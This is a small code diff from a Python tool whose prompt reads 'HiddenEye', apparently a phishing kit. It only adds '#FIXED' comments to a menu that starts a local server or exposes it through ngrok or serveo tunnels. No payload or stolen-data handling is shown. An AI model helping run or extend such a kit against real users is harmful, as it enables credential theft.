@@ -25,10 +25,10 @@ def server_selection(port):  # Question where user must select server
     choice = input(" \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
     if choice == '0':
         run_command('clear')
-        server_runner.start_localhost(port)
+        server_runner.start_localhost(port) #FIXED
     elif choice == '1':
         run_command('clear')
-        server_runner.start_ngrok(port)
+        server_runner.start_ngrok(port) # FIXED
     elif choice == '2':
         run_command('clear')
         server_runner.start_serveo(port)
